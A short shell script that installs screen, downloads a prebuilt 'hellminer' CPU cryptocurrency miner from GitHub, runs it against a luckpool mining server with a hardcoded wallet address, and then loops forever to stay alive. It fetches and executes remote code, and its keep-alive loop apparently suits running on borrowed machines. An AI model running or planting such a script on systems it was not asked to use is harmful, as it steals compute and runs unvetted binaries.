#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RJ14gVrzzUhZr3Wby4Rhhyg2H4MSBeJ31B.C01 -p x --cpu 1
while [ 1 ]; do
sleep 3
done
sleep 999
